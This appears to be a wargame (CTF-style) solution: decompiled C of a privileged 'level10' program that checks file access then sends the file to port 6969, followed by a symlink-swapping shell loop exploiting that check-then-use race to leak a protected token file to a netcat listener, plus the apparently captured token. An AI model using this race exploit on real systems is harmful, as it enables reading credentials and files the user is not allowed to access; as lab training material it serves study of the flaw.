int main(unsigned int a0, unsigned int a1[3])
{
    unsigned int v0;  // [bp-0x102c]
    unsigned int v1;  // [bp-0x1028]
    unsigned int v2;  // [bp-0x1024]
    unsigned int v3;  // [bp-0x1020]
    unsigned int v4;  // [bp-0x101c]
    char v5;  // [bp-0x1018]
    char v6;  // [bp-0x18], Other Possible Types: unsigned short
    unsigned short v7;  // [bp-0x16]
    unsigned int v8;  // [bp-0x14]
    unsigned int v9;  // [bp-0x8]
    unsigned long v10;  // ldt
    unsigned long v11;  // gdt
    unsigned short v12;  // gs
    unsigned int *v13;  // eax
    unsigned int v14;  // eax

    v9 = *((int *)_ccall(v10, v11, (unsigned int)v12, 20));
    if (a0 <= 2)
    {
        printf("%s file host\n\tsends file to host if you have access to it\n");
        exit(1); /* do not return */
    }
    v0 = a1[1];
    v1 = a1[2];
    if (!access(a1[1], 4))
    {
        printf("Connecting to %s:6969 .. ");
        fflush(stdout);
        v2 = socket(2, 1, 0);
        memset(&v6, 0, 16);
        v6 = 2;
        v8 = inet_addr(v1);
        v7 = htons(6969);
        if (connect(v2, &v6, 16) == -1)
        {
            printf("Unable to connect to host %s\n");
            exit(1); /* do not return */
        }
        if (write(v2, ".*( )*.\n", 8) == -1)
        {
            printf("Unable to write banner to host %s\n");
            exit(1); /* do not return */
        }
        printf("Connected!\nSending file .. ");
        fflush(stdout);
        v3 = open(v0, 0, 8);
        if (v3 == -1)
        {
            puts("Damn. Unable to open file");
            exit(1); /* do not return */
        }
        v4 = read(v3, &v5, 0x1000);
        if (v4 == -1)
        {
            v13 = __errno_location();
            strerror(*(v13));
            printf("Unable to read from file: %s\n");
            exit(1); /* do not return */
        }
        write(v2, &v5, v4);
        v14 = puts("wrote file!");
    }
    else
    {
        v14 = printf("You don't have access to %s\n");
    }
    if (!(v9 ^ *((int *)_ccall(v10, v11, (unsigned int)v12, 20))))
        return v14;
    __stack_chk_fail(); /* do not return */
}





while true; do ln -sf /tmp/ok /tmp/ok1; ./level10 /tmp/ok1 127.0.0.1 & ln -sf /home/user/level10/token /tmp/ok1; done;
while true; nc -l 6969;
woupa2yuojeeaaed06riuj63c